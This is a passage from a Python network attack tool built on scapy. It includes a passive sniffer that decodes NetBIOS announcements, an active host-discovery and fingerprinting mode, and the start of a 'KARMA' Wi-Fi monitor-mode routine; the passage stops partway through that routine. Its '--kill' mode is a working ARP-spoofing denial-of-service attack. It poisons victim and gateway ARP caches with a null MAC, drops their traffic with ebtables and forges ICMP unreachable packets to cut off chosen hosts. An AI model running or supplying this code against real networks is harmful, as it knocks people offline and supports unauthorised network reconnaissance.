        0x00400000: "DFS Server",
        0x00800000: "Local List Only",
        0x01000000: "Domain Enum"
    }

    while True:
        sig_pos = payload.find(signature, pos)
        if sig_pos < 0:
            return None

        pos = sig_pos + 1
        start = sig_pos - 30
        if start < 0 or start + 32 > len(payload):
            continue

        # Only decode Host Announcement messages
        if payload[start] != 0x01:
            continue

        # Extract the 16-byte server name
        name_raw = payload[start + 6:start + 22]
        hostname = (name_raw.split(b"\x00", 1)[0].decode("ascii", errors="replace").strip())
        if not hostname or not hostname.isprintable():
            continue

        update_count = payload[start + 1]

        # Preserve the raw periodicity value.
        # Its interpretation depends on the protocol context.
        update_periodicity = int.from_bytes(payload[start + 2:start + 6], byteorder="little")
        os_major = payload[start + 22]
        os_minor = payload[start + 23]
        server_type = int.from_bytes(payload[start + 24:start + 28], byteorder="little")

        browser_major = payload[start + 28]
        browser_minor = payload[start + 29]

        roles = [
            label
            for bit, label in flags.items()
            if server_type & bit
        ]

        return {
            # Message identification
            "message_type": "Host Announcement",
            "command": f"0x{payload[start]:02X}",
            "signature": signature.hex(" "),

            # Host information
            "hostname": hostname,
            "hostname_raw": name_raw.hex(" "),

            # Announcement timing fields
            "update_count": update_count,
            "update_periodicity_raw": update_periodicity,

            # Advertised OS version numbers
            "os_version": f"{os_major}.{os_minor}",
            "os_version_major": os_major,
            "os_version_minor": os_minor,

            # Browser protocol version
            "browser_version": f"{browser_major}.{browser_minor}",
            "browser_version_major": browser_major,
            "browser_version_minor": browser_minor,

            # Server capabilities and roles
            "device_type": roles,
            "server_type": f"0x{server_type:08X}",
            "server_type_raw": server_type,

            # Convenient derived indicators
            "is_workstation": bool(server_type & 0x00000001),
            "is_server": bool(server_type & 0x00000002),
            "is_print_server": bool(server_type & 0x00000200),
            "is_master_browser": bool(server_type & 0x00020000),
            "is_domain_master_browser": bool(server_type & 0x00040000),
            "is_domain_controller": bool(server_type & 0x00000008)
        }

    return None

def has_browser_value(info):
    if not info:
        return False

    browser_name = info.get("browser_name")
    device_type = info.get("device_type") or set()
    server_type = info.get("server_type")
    os_version = info.get("os_version")

    return (
        browser_name not in (None, "", "?")
        or bool(device_type)
        or server_type not in (None, "", "?")
        or os_version not in (None, "", "?")
    )

def packet_handler(pkt):
    try:
        ip = None
        mac = None
        hostname = None
        proto = None
        ports = None
        dns_queries = []

        browser_info = None
        browser_name = None
        device_type = []
        server_type = None
        os_version = None

        # ARP
        if ARP in pkt and pkt[ARP].op in (1, 2):
            ip = pkt[ARP].psrc
            mac = pkt[ARP].hwsrc

        # IP
        elif IP in pkt:
            if Ether in pkt:
                mac = pkt[Ether].src

            ip = pkt[IP].src
            proto_num = pkt[IP].proto
            proto = {
                0: "HOPOPT",
                1: "ICMP",
                2: "IGMP",
                3: "GGP",
                4: "IPv4",
                5: "ST",
                6: "TCP",
                7: "CBT",
                8: "EGP",
                9: "IGP",
                10: "BBN-RCC-MON",
                11: "NVP-II",
                12: "PUP",
                13: "ARGUS",
                14: "EMCON",
                15: "XNET",
                16: "CHAOS",
                17: "UDP",
                18: "MUX",
                19: "DCN-MEAS",
                20: "HMP",
                21: "PRM",
                22: "XNS-IDP",
                23: "TRUNK-1",
                24: "TRUNK-2",
                25: "LEAF-1",
                26: "LEAF-2",
                27: "RDP",
                28: "IRTP",
                29: "ISO-TP4",
                30: "NETBLT",
                31: "MFE-NSP",
                32: "MERIT-INP",
                33: "DCCP",
                34: "3PC",
                35: "IDPR",
                36: "XTP",
                37: "DDP",
                38: "IDPR-CMTP",
                39: "TP++",
                40: "IL",
                41: "IPv6",
                42: "SDRP",
                43: "IPv6-Route",
                44: "IPv6-Frag",
                45: "IDRP",
                46: "RSVP",
                47: "GRE",
                48: "DSR",
                49: "BNA",
                50: "ESP",
                51: "AH",
                52: "I-NLSP",
                53: "SWIPE",
                54: "NARP",
                55: "MOBILE",
                56: "TLSP",
                57: "SKIP",
                58: "IPv6-ICMP",
                59: "IPv6-NoNxt",
                60: "IPv6-Opts",
                61: "Any Host Internal Protocol",
                62: "CFTP",
                63: "Any Local Network",
                64: "SAT-EXPAK",
                65: "KRYPTOLAN",
                66: "RVD",
                67: "IPPC",
                68: "Distributed File System",
                69: "SAT-MON",
                70: "VISA",
                71: "IPCV",
                72: "CPNX",
                73: "CPHB",
                74: "WSN",
                75: "PVP",
                76: "BR-SAT-MON",
                77: "SUN-ND",
                78: "WB-MON",
                79: "WB-EXPAK",
                80: "ISO-IP",
                81: "VMTP",
                82: "SECURE-VMTP",
                83: "VINES",
                84: "TTP",
                85: "NSFNET-IGP",
                86: "DGP",
                87: "TCF",
                88: "EIGRP",
                89: "OSPF",
                90: "Sprite-RPC",
                91: "LARP",
                92: "MTP",
                93: "AX.25",
                94: "IPIP",
                95: "MICP",
                96: "SCC-SP",
                97: "ETHERIP",
                98: "ENCAP",
                99: "Any Private Encryption Scheme",
                100: "GMTP",
                101: "IFMP",
                102: "PNNI",
                103: "PIM",
                104: "ARIS",
                105: "SCPS",
                106: "QNX",
                107: "A/N",
                108: "IPComp",
                109: "SNP",
                110: "Compaq-Peer",
                111: "IPX-in-IP",
                112: "VRRP",
                113: "PGM",
                114: "Any 0-hop Protocol",
                115: "L2TP",
                116: "DDX",
                117: "IATP",
                118: "STP",
                119: "SRP",
                120: "UTI",
                121: "SMP",
                122: "SM",
                123: "PTP",
                124: "ISIS over IPv4",
                125: "FIRE",
                126: "CRTP",
                127: "CRUDP",
                128: "SSCOPMCE",
                129: "IPLT",
                130: "SPS",
                131: "PIPE",
                132: "SCTP",
                133: "FC",
                134: "RSVP-E2E-IGNORE",
                135: "Mobility Header",
                136: "UDPLite",
                137: "MPLS-in-IP",
                138: "manet",
                139: "HIP",
                140: "Shim6",
                141: "WESP",
                142: "ROHC",
                255: "Reserved",
            }.get(proto_num, f"Unknown({proto_num})")

            # Ports if TCP/UDP
            if TCP in pkt:
                ports = (pkt[TCP].sport, pkt[TCP].dport)
            elif UDP in pkt:
                ports = (pkt[UDP].sport, pkt[UDP].dport)

            if UDP in pkt and (pkt[UDP].sport == 138 or pkt[UDP].dport == 138):
                try:
                    raw = bytes(pkt[UDP].payload)
                    browser_info = decode_browser_announcement(raw)
                    if browser_info:
                        browser_name = browser_info["hostname"]
                        device_type = browser_info["device_type"]
                        server_type = browser_info["server_type"]
                        os_version = browser_info["os_version"]            
                except Exception as e:
                    print(f"{R}[BROWSER ERROR]{RESET} {e}")

            # DNS query
            if DNS in pkt and pkt[DNS].qr == 0:  # DNS request
                try:
                    query = pkt[DNSQR].qname.decode()
                    if ip != MY_IP:
                        dns_queries.append(query)
                except Exception:
                    pass

        if not ip:
            return

        if ip and ip not in seen_hosts:
            hostname = get_hostname(ip) or "?"
            seen_hosts[ip] = {
                "hostname": hostname,
                "first_seen": time.strftime("%H:%M:%S"),
                "mac": mac or "?",            
                "oui": get_oui(mac, oui_map) if mac else "?",
                "proto": proto or "?",
                "ports": ports or "?",
                "browser_name": browser_name or "?",
                "device_type": set(device_type),
                "server_type": server_type or "?",
                "os_version": os_version or "?",
                "dns_queries": set(dns_queries)
            }
            info = seen_hosts[ip]
            print(f"{G}[+] {Y}{ip:15}{RESET} | Hostname: {info['hostname']:25} | MAC: {info['mac']:20} | OUI: {info['oui']:30} | Proto: {info['proto']:5} | Ports: {info['ports']}") # Screen display during the search
        
            if info["dns_queries"]:
                print(f"--> DNS queries: {', '.join(sorted(info['dns_queries']))}")
            
            return

        info = seen_hosts[ip]
        updated = False

        if mac and info["mac"] == "?":
            info["mac"] = mac
            info["oui"] = get_oui(mac, oui_map)
            updated = True

        if info["hostname"] == "?":
            hostname = get_hostname(ip)
            if hostname:
                info["hostname"] = hostname
                updated = True

        if proto and info["proto"] == "?":
            info["proto"] = proto
            updated = True

        if ports and info["ports"] == "?":
            info["ports"] = ports
            updated = True

        for query in dns_queries:
            if query not in info["dns_queries"]:
                info["dns_queries"].add(query)
                updated = True

        if browser_name and info.get("browser_name") != browser_name:
            info["browser_name"] = browser_name
            updated = True

        if device_type:
            old_types = info.setdefault("device_type", set())
            new_types = set(device_type) - old_types

            if new_types:
                old_types.update(new_types)
                updated = True

        if server_type and info.get("server_type") != server_type:
            info["server_type"] = server_type
            updated = True

        if os_version and info.get("os_version") != os_version:
            info["os_version"] = os_version
            updated = True

        if updated:
            print(f"{G}[*] MAJ {Y}{ip:15}{RESET} | Hostname: {info['hostname']:25} | MAC: {info['mac']:20} | OUI: {info['oui']:30} | Proto: {info['proto']:5} | Ports: {info['ports']}")
            if has_browser_value(info):
                device_type_text = ", ".join(sorted(info.get("device_type") or set())) or "?"
                print(f"--> Device: {C}{info.get('browser_name', '?')}{RESET} Type: {C}{device_type_text}{RESET} Server Type: {C}{info.get('server_type', '?')}{RESET} OS: {C}{info.get('os_version', '?')}{RESET}")

            if info["dns_queries"]:
                print(f"--> DNS queries: {C}{', '.join(sorted(info['dns_queries']))}{RESET}")

    except Exception as e:
        print(f"{R}[PACKET ERROR]{RESET} {type(e).__name__}: {e}")

def print_summary():
    while True:
        os.system("clear")
        print(f"\n{summary}\n\n{C}=== Seen devices ==={RESET}")
        for ip, info in seen_hosts.items():
            print(f"{Y}{ip:15}{RESET} | {C}{info['hostname']:25}{RESET} | MAC: {Y}{info['mac']:20}{RESET} | OUI: {C}{info['oui']:30}{RESET} | Proto: {info['proto']:5} | Ports: {info['ports']}")
            if has_browser_value(info):
                device_type_text = ", ".join(sorted(info.get("device_type") or set())) or "?"
                print(f"--> Device: {C}{info.get('browser_name', '?')}{RESET} Type: {C}{device_type_text}{RESET} Server Type: {C}{info.get('server_type', '?')}{RESET} OS: {C}{info.get('os_version', '?')}{RESET}")
            
            if info["dns_queries"]:
                print(f"--> DNS queries: {C}{', '.join(sorted(info['dns_queries']))}{RESET}")
        time.sleep(10)



########################## DISCOVERY MODE (--discovery) ##########################
PING_TIMEOUT = 2
TCP_TIMEOUT = 2
ARP_TIMEOUT = 2
MAX_WORKERS = 15

def get_netbios_info(ip):
    try:
        result = subprocess.run(["nbtscan", "-v", ip], capture_output=True, text=True, timeout=3, check=False)
        output = result.stdout
        name_match = re.search(r"^(\S+)\s+<00>\s+UNIQUE", output, re.MULTILINE | re.IGNORECASE)
        mac_match = re.search(r"Adapter address:\s*([0-9a-f:]{17})", output, re.IGNORECASE)
        name = name_match.group(1) if name_match else None
        mac = mac_match.group(1).lower() if mac_match else None
        return name, mac
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        return None, None

def get_snmp_sysinfo(ip, community="public"):
    try:
        result = subprocess.run(
            [
                "snmpget", "-v1", "-c", community,
                "-t", "1", "-r", "0",
                ip, "1.3.6.1.2.1.1.1.0"
            ],
            capture_output=True,
            text=True,
            timeout=2,
            check=False
        )

        if result.returncode == 0:
            return result.stdout.strip()

    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass

    return None

def new_device(ip):
    """Structure uniforme pour chaque IP."""
    return {
        "ip": ip,
        "device": None,
        "hostname": None,
        "mac": None,
        "vendor": None,
        "device_type": "Inconnu",
        "os": "Inconnu",
        "confidence": "Weak",
        "sources": [],
        "open_ports": [],
        "snmp_sysdescr": None,
        "browser_name": None,
        "browser_roles": [],
        "browser_os": None
    }

def add_source(device, source):
    if source not in device["sources"]:
        device["sources"].append(source)

def merge_value(device, key, value):
    if value is not None and value != "":
        device[key] = value

def arp_scan(network, iface, oui_map):
    print(f"[*] Starting ARP scan on {network}")
    packet = (Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network))
    answered, _ = srp(packet, timeout=ARP_TIMEOUT, retry=1, iface=iface, verbose=0)
    devices = {}
    for _, response in answered:
        ip = response.psrc
        mac = response.hwsrc.lower()
        device = new_device(ip)
        device["mac"] = mac
        device["vendor"] = get_vendor(mac, oui_map)
        device["hostname"] = get_hostname(ip)
        device["device"] = device["hostname"]
        device["confidence"] = "High"
        add_source(device, "ARP")
        devices[ip] = device
    return devices

def icmp_ping(ip, timeout=PING_TIMEOUT):
    packet = IP(dst=ip) / ICMP(type=8)
    response = sr1(packet, timeout=timeout, verbose=0)
    if response is None or not response.haslayer(IP):
        return False

    if response[IP].src != ip:
        return False
    return (response.haslayer(ICMP) and response[ICMP].type == 0 and response[ICMP].code == 0)

def icmp_timestamp_ping(ip, timeout=PING_TIMEOUT):
    packet = IP(dst=ip) / ICMP(type=13)
    response = sr1(packet, timeout=timeout, verbose=0)
    if response is None or not response.haslayer(IP):
        return False

    if response[IP].src != ip:
        return False
    return (response.haslayer(ICMP) and response[ICMP].type == 14)

def icmp_scan(network):
    print("[*] Starting ICMP scan")
    ips = [str(ip) for ip in ipaddress.IPv4Network(network).hosts()]
    alive = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {
            executor.submit(icmp_ping, ip): ip
            for ip in ips
        }

        for future in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="ICMP", unit="ip"):
            ip = futures[future]
            try:
                if future.result():
                    alive.append(ip)
            except Exception:
                pass
    return alive

def tcp_probe(ip, ports=(80, 443, 22), flags="S"):
    for port in ports:
        packet = IP(dst=ip) / TCP(dport=port, flags=flags)
        response = sr1(packet, timeout=TCP_TIMEOUT, verbose=0)
        if response is None or not response.haslayer(IP):
            continue

        if response[IP].src != ip:
            continue

        if not response.haslayer(TCP):
            continue

        tcp_flags = int(response[TCP].flags)
        if tcp_flags & 0x04: # RST
            return True

        if flags == "S" and tcp_flags & 0x12 == 0x12:
            return True

        if flags == "A" and tcp_flags & 0x04:
            return True
    return False

def tcp_syn_scan(ip):
    return tcp_probe(ip, ports=(80, 443, 22, 445, 139), flags="S")

def tcp_ack_ping(ip):
    return tcp_probe(ip, ports=(80, 443), flags="A")

def ssdp_discover(timeout=3):
    print("[*] SSDP discovery")
    message = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        'MAN: "ssdp:discover"\r\n'
        "MX: 2\r\n"
        "ST: ssdp:all\r\n\r\n"
    )

    results = {}
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock:
        sock.settimeout(timeout)
        try:
            sock.bind(("", 0))
            sock.sendto(message.encode(), ("239.255.255.250", 1900))
            while True:
                data, address = sock.recvfrom(65507)
                ip = address[0]
                results.setdefault(ip, []).append(data.decode("utf-8", errors="replace"))
        except socket.timeout:
            pass
        except OSError as exc:
            print(f"[!] SSDP error: {exc}")
    return results

def fallback_check(ip):
    sources = []
    try:
        if icmp_timestamp_ping(ip):
            sources.append("ICMP-Timestamp")
    except Exception:
        pass
    try:
        if tcp_syn_scan(ip):
            sources.append("TCP")
    except Exception:
        pass
    try:
        if tcp_ack_ping(ip):
            sources.append("TCP-ACK")
    except Exception:
        pass
    return ip, sources

def infer_device_type(device):
    hostname = ((device.get("hostname") or "") + " " + (device.get("browser_name") or "") + " " + (device.get("device") or "")).lower()
    vendor = (device.get("vendor") or "").lower()
    ports = set(device.get("open_ports", []))
    roles = " ".join(device.get("browser_roles", [])).lower()

    if any(x in hostname for x in ("printer", "printserver", "print-server", "imprimante", "laserjet", "officejet", "deskjet", "brother", "epson", "xerox")):
        return "Printer"

    if 631 in ports or 9100 in ports or 515 in ports:
        return "Printer / Print Server (probable)"

    if "print server" in roles or "print queue server" in roles:
        return "Print Server"

    if any(x in hostname for x in ("nas", "serveurnas", "synology", "diskstation", "qnap", "terramaster", "asustor", "truenas", "freenas", "unraid", "mycloud")):
        return "NAS / Storage Server"

    if any(x in vendor for x in ("qnap", "synology", "terramaster", "asustor")):
        return "NAS (probable)"

    if 445 in ports and any(x in hostname for x in ("server", "srv", "storage", "files")):
        return "File Server (probable)"

    if any(x in hostname for x in ("router", "gateway", "gw-", "firewall", "bbox", "livebox", "freebox", "fritz", "openwrt", "opnsense", "pfsense", "unifi", "ubiquiti", "accesspoint", "access-point", "wireless-ap")):
        return "Router / Gateway / Network Appliance"

    if any(x in vendor for x in ("sagemcom", "mikrotik", "ubiquiti", "fortinet", "palo alto", "netgear", "aruba networks", "cisco", "juniper")):
        return "Network Device (probable)"

    if any(x in hostname for x in ("iphone", "ipad", "macbook", "imac", "mac-mini", "macmini", "apple-tv", "appletv", "homepod")):
        if any(x in hostname for x in ("iphone", "ipad")):
            return "Apple Mobile Device"

        if any(x in hostname for x in ("apple-tv", "appletv", "homepod")):
            return "Apple Home / Media Device"

        return "Apple Computer"

    if "apple" in vendor:
        return "Apple Device (type unknown)"

    if any(x in hostname for x in ("android", "pixel", "galaxy", "samsung", "oneplus", "xiaomi", "redmi", "huawei", "honor", "motorola", "moto-", "oppo", "vivo", "realme", "nothing-phone")):
        return "Smartphone / Tablet (probable)"

    if any(x in hostname for x in ("tapo", "smartplug", "smart-plug", "smartbulb", "smart-bulb", "tuya", "shelly", "sonoff", "esp8266", "esp32", "homeassistant", "home-assistant", "thermostat", "smartcam", "doorbell", "sensor", "iot")):
        return "Smart Home / IoT Device"

    if any(x in vendor for x in ("espressif", "tuya", "shelly", "tasmota", "sonoff")):
        return "IoT Device (probable)"

    if any(x in hostname for x in ("desktop-", "laptop-", "workstation", "pc-", "computer-", "windows-pc")):
        return "Desktop / Laptop Computer"

    if any(x in hostname for x in ("raspberrypi", "raspberry-pi", "orangepi", "odroid", "minipc", "mini-pc")):
        return "Single-Board / Mini Computer"

    if "nt workstation" in roles:
        return "Windows Workstation (Browser role)"

    if "nt server" in roles:
        return "Windows Server (Browser role)"

    if "domain controller" in roles:
        return "Domain Controller"

    if "master browser" in roles or "domain master browser" in roles:
        return "Master Browser Host"

    if "server" in roles and ("workstation" in roles):
        return "Workstation / Server (Browser roles)"

    if any(x in hostname for x in ("proxmox", "esxi", "vmware", "hyperv", "hyper-v", "xcp-ng", "xenserver", "virtualbox", "docker-host")):
        return "Virtualization Host (probable)"

    if 3389 in ports:
        return "Computer with Remote Desktop (RDP)"

    if 445 in ports or 139 in ports:
        return "SMB Host (Windows or Samba probable)"

    if 22 in ports and any(x in hostname for x in ("linux", "ubuntu", "debian", "raspberry")):
        return "Linux Computer / Server (probable)"

    if 554 in ports:
        return "Media / IP Camera Device (probable)"

    if 1900 in ports:
        return "UPnP Device (type unknown)"

    if device.get("browser_roles"):
        return "NetBIOS Browser Host (type unknown)"

    if vendor:
        return "Unknown Device (vendor identified)"

    return "Unknown"

def infer_os(device):
    hostname = ((device.get("hostname") or "") + " " + (device.get("browser_name") or "") + " " + (device.get("device") or "")).lower()
    vendor = (device.get("vendor") or "").lower()
    browser_os = device.get("browser_os")
    sysdescr = device.get("snmp_sysdescr")
    roles = " ".join(device.get("browser_roles") or []).lower()
    ports = set(device.get("open_ports") or [])

    if browser_os:
        return browser_os

    if sysdescr:
        text = sysdescr.lower()

        if any(x in text for x in ("windows 11", "windows 10", "windows 8", "windows 7", "windows vista", "windows xp")):
            return "Windows Desktop (SNMP)"

        if any(x in text for x in ("windows server", "windows server 2003", "windows server 2008", "windows server 2012", "windows server 2016", "windows server 2019", "windows server 2022", "windows server 2025")):
            return "Windows Server (SNMP)"

        if "windows" in text or "microsoft" in text:
            return "Windows (SNMP)"

        if any(x in text for x in ("ubuntu", "debian", "fedora", "centos", "red hat", "rhel", "alpine", "arch linux", "opensuse", "linux")):
            return "Linux (SNMP)"

        if any(x in text for x in ("qts", "qnap")):
            return "QTS / Linux-based (SNMP)"

        if any(x in text for x in ("synology", "diskstation", "dsm ")):
            return "Synology DSM / Linux-based (SNMP)"

        if any(x in text for x in ("freebsd", "openbsd", "netbsd")):
            return "BSD-based OS (SNMP)"

        if any(x in text for x in ("darwin", "mac os", "macos")):
            return "macOS (SNMP)"

        if any(x in text for x in ("esxi", "vmware")):
            return "VMware ESXi (SNMP)"

        if "proxmox" in text:
            return "Proxmox VE / Linux-based (SNMP)"

        return f"Unknown OS — SNMP description: {sysdescr[:120]}"

    if any(x in roles for x in ("nt workstation", "nt server", "domain controller", "master browser", "domain master browser")):
        return "Windows NT-family probable (Browser/NetBIOS)"

    if any(x in hostname for x in ("windows", "win10", "win11", "win-pc")):
        return "Windows probable (hostname)"

    if any(x in hostname for x in ("macbook", "imac", "mac-mini", "macmini", "mac-studio", "macpro")):
        return "macOS probable (hostname)"

    if any(x in hostname for x in ("iphone", "ipad")):
        return "iOS / iPadOS probable (hostname)"

    if any(x in hostname for x in ("pixel", "android", "galaxy", "xiaomi", "redmi", "oneplus", "huawei", "honor", "motorola", "oppo", "vivo")):
        return "Android probable (hostname)"

    if any(x in hostname for x in ("raspberrypi", "raspberry-pi", "raspberry")):
        return "Linux probable (Raspberry Pi hostname)"

    if any(x in hostname for x in ("proxmox", "pve")):
        return "Proxmox VE / Linux-based probable (hostname)"

    if any(x in hostname for x in ("esxi", "vmware")):
        return "VMware ESXi probable (hostname)"

    if "qnap" in vendor:
        return "QTS / Linux-based probable (vendor)"

    if "synology" in vendor:
        return "Synology DSM / Linux-based probable (vendor)"

    if "apple" in vendor:
        return "Apple OS — macOS/iOS/iPadOS unknown"

    if any(x in vendor for x in ("microsoft", "hewlett packard", "dell", "lenovo", "intel", "asus", "acer", "msi")):
        return "Unknown — computer hardware vendor"

    if 3389 in ports:
        return "Windows probable (RDP port detected)"

    if 445 in ports or 139 in ports:
        return "Windows or Samba/Linux probable (SMB ports detected)"

    if 22 in ports:
        return "SSH-enabled system — OS unknown"

    return "Unknown"

def enrich_device(device, oui_map):
    ip = device["ip"]
    if not device.get("hostname"):
        hostname = get_hostname(ip)
        if hostname:
            device["hostname"] = hostname
            add_source(device, "DNS inverse")

    if not device.get("hostname") or device["hostname"] == ip:
        name, mac = get_netbios_info(ip)
        if name:
            device["hostname"] = name
            add_source(device, "NetBIOS")

        if mac and not device.get("mac"):
            device["mac"] = mac
            device["vendor"] = get_vendor(mac, oui_map)

    sysdescr = get_snmp_sysinfo(ip)
    if sysdescr:
        device["snmp_sysdescr"] = sysdescr
        add_source(device, "SNMP")

    device["device"] = (device.get("browser_name") or device.get("hostname") or ip)
    device["device_type"] = infer_device_type(device)
    device["os"] = infer_os(device)
    if "ARP" in device["sources"]:
        device["confidence"] = "High"
    elif any(s in device["sources"] for s in ("SSDP", "TCP", "ICMP")):
        device["confidence"] = "Medium"
    else:
        device["confidence"] = "Weak"
    return device

def discover_network(network, iface, oui_map):
    subnet = ipaddress.IPv4Network(network, strict=False)
    devices = {}

    # 1. ARP
    arp_devices = arp_scan(str(subnet), iface, oui_map)
    devices.update(arp_devices)

    # 2. SSDP
    if subnet.num_addresses > 2:
        ssdp_results = ssdp_discover()
        for ip, responses in ssdp_results.items():
            try:
                ip_addr = ipaddress.IPv4Address(ip)
            except ipaddress.AddressValueError:
                continue

            if ip_addr not in subnet:
                continue
            device = devices.setdefault(ip, new_device(ip))
            add_source(device, "SSDP")
            device["ssdp_responses"] = responses

    # 3. ICMP
    alive_icmp = icmp_scan(str(subnet))
    for ip in alive_icmp:
        device = devices.setdefault(ip, new_device(ip))
        add_source(device, "ICMP")

    # 4. Fallback
    known_ips = set(devices)
    remaining = [
        str(ip)
        for ip in subnet.hosts()
        if str(ip) not in known_ips
    ]

    print("[*] Fallback discovery (ICMP-Timestamp / TCP)")
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {
            executor.submit(fallback_check, ip): ip
            for ip in remaining
        }

        for future in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="Fallback", unit="ip"):
            try:
                ip, sources = future.result()
            except Exception:
                continue

            if not sources:
                continue

            device = devices.setdefault(ip, new_device(ip))
            for source in sources:
                add_source(device, source)

    # 5. enrichment
    print("[*] Enriching hosts")
    for device in tqdm(list(devices.values()), desc="Enriching", unit="host"):
        try:
            enrich_device(device, oui_map)
        except Exception as exc:
            print(f"[!] Enrichment error for {device['ip']}: {exc}")
    return devices

def print_devices(devices):
    print(f"\n{B}{Style.BRIGHT}{'=' * 72}{RESET}")
    print(f"{G}{Style.BRIGHT}[+] Hosts detected: {len(devices)}{RESET}")
    print(f"{B}{Style.BRIGHT}{'=' * 72}{RESET}\n")
    for index, ip in enumerate(sorted(devices, key=ipaddress.IPv4Address), start=1):
        d = devices[ip]
        mac = d.get("mac") or "N/A"
        vendor = d.get("vendor") or "Unknown"
        device = d.get("device") or "Unknown"
        device_type = d.get("device_type") or "Unknown"
        os_name = d.get("os") or "Unknown"
        confidence = d.get("confidence") or "Weak"
        sources = d.get("sources") or []
        confidence_lower = str(confidence).lower()
        if confidence_lower in ("high", "strong"):
            confidence_color = G
        elif confidence_lower in ("medium", "moderate"):
            confidence_color = Y
        else:
            confidence_color = R

        os_lower = str(os_name).lower()
        if "windows" in os_lower:
            os_color = B
        elif any(x in os_lower for x in ("linux", "ubuntu", "debian", "qts")):
            os_color = G
        elif any(x in os_lower for x in ("macos", "ios", "apple")):
            os_color = M
        elif "android" in os_lower:
            os_color = G
        elif "unknown" in os_lower:
            os_color = R
        else:
            os_color = C

        type_lower = str(device_type).lower()
        if any(x in type_lower for x in ("router", "gateway", "network")):
            type_color = B
        elif any(x in type_lower for x in ("server", "nas")):
            type_color = M
        elif any(x in type_lower for x in ("printer", "print")):
            type_color = Y
        elif any(x in type_lower for x in ("iot", "smart home")):
            type_color = C
        elif "unknown" in type_lower:
            type_color = R
        else:
            type_color = G

        print(f"{B}{Style.BRIGHT}{'-' * 72}{RESET}")
        print(f"{G}{Style.BRIGHT}[{index:02d}] {ip:<15}{RESET} {C}{mac}{RESET}")
        print(f"   {Y}Vendor      {RESET}: {C}{vendor}{RESET}")
        print(f"   {Y}Device      {RESET}: {G}{device}{RESET}")
        print(f"   {Y}Type        {RESET}: {type_color}{device_type}{RESET}")
        print(f"   {Y}OS          {RESET}: {os_color}{os_name}{RESET}")
        print(f"   {Y}Confidence  {RESET}: {confidence_color}{Style.BRIGHT}{confidence}{RESET}")
        print(f"   {Y}Sources     {RESET}: {C}{', '.join(map(str, sources)) if sources else 'None'}{RESET}")
        ports = d.get("open_ports") or []
        if ports:
            print(f"   {Y}Open ports  {RESET}: {R}{', '.join(map(str, sorted(ports)))}{RESET}")

        browser_roles = d.get("browser_roles") or []
        if browser_roles:
            print(f"   {Y}Browser     {RESET}: {MA}{', '.join(map(str, browser_roles))}{RESET}")

        browser_name = d.get("browser_name")
        if browser_name:
            print(f"   {Y}NetBIOS     {RESET}: {MA}{browser_name}{RESET}")

        sysdescr = d.get("snmp_sysdescr")
        if sysdescr:
            print(f"   {Y}SNMP        {RESET}: {C}{sysdescr[:100]}{RESET}")

        print()

    print(f"{B}{Style.BRIGHT}{'=' * 72}{RESET}")
    print(f"{G}{Style.BRIGHT}[+] Scan completed.{RESET}\n")


########################## KILL CONNEXION MODE (--kill) ##########################
def kill_connection():
    global victim_macs, gateway_macs
    for v_ip in victim_ips:
        mac = get_mac(v_ip)
        if mac:
            victim_macs[v_ip] = mac
            print(f"[+] Target {v_ip} -> {mac}")
        else:
            print(f"[-] MAC not found for target {v_ip}")

    if not victim_macs:
        print(f"[-] {R}No target MAC found. Exiting{RESET}")
        exit(1)

    for gw_ip in gateway_ips:
        gw_mac = get_mac(gw_ip)
        if gw_mac:
            gateway_macs[gw_ip] = gw_mac
            print(f"[+] Gateway {gw_ip} -> {gw_mac}")
        else:
            print(f"[-] MAC not found for {gw_ip}, skipping")

    if not gateway_macs:
        print(f"[-] {R}No gateway MAC found. Exiting{RESET}")
        exit(1)

    print("[*] ARP spoof with KILL mode: Killing target connexion ...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    blackhole_mac = "00:00:00:00:00:00"

    # ebtables
    try:
        for v_ip in victim_ips:
            os.system(f"ebtables -A OUTPUT -p IPv4 --ip-src {v_ip} -j DROP")
            os.system(f"ebtables -A FORWARD -p IPv4 --ip-src {v_ip} -j DROP")
        print("[*] ebtables: rules set")
    except Exception:
        print(f"[!] {R}ebtables not disponible ... Check installation{RESET}")

    try:
        print(f"[*] {Y}Attack running ...{RESET}")
        while True:
            for v_ip, v_mac in victim_macs.items():
                for gw_ip, gw_mac in gateway_macs.items():
                    pkt_to_victim = Ether(dst=v_mac) / ARP(op=2, pdst=v_ip, psrc=gw_ip, hwsrc=blackhole_mac, hwdst=v_mac)
                    sendp(pkt_to_victim, iface=iface_spy, verbose=0)
                    pkt_to_gateway = Ether(dst=gw_mac) / ARP(op=2, pdst=gw_ip, psrc=v_ip, hwsrc=blackhole_mac, hwdst=gw_mac)
                    sendp(pkt_to_gateway, iface=iface_spy, verbose=0)
                    icmp_unreachable = Ether(dst=gw_mac) / IP(dst=v_ip, src=gw_ip) / ICMP(type=3, code=1)
                    sendp(icmp_unreachable, iface=iface_spy, verbose=0)

            time.sleep(0.2)
    except KeyboardInterrupt:
        print(f"\n[*] {R}Ctrl + C detected. Closing ...{RESET}")
        restore_arp()
        for v_ip in victim_ips:
            os.system(f"ebtables -D OUTPUT -p IPv4 --ip-src {v_ip} -j DROP")
            os.system(f"ebtables -D FORWARD -p IPv4 --ip-src {v_ip} -j DROP")
        print("[*] Ebtables rules removed")
        sys.exit(0)



########################## KAMRMA SCANNER ##########################
def set_monitor_mode(interface, karma_mode):
    print(f"[*] Enabling monitor mode on {interface}...")

    try:
        out = subprocess.check_output(
            ["sudo", "airmon-ng", "start", interface],
            text=True, stderr=subprocess.STDOUT
        )
        # Stop interfering processes (like NetworkManager)
        if karma_mode == "karma_on":
            pass
        elif karma_mode == "karma_off":
            subprocess.call(["airmon-ng", "check", "kill"])

    except subprocess.CalledProcessError as e:
        print(f"[!] {R}Auto use of airmon on interface failed :\n{e.output.strip()}")
        print(f"{RESET}[!] {R}Try the manual way !{RESET}")
        exit(1)

    # ---------- 1)  Try to read monitor mode in the output ----------
    regexes = [
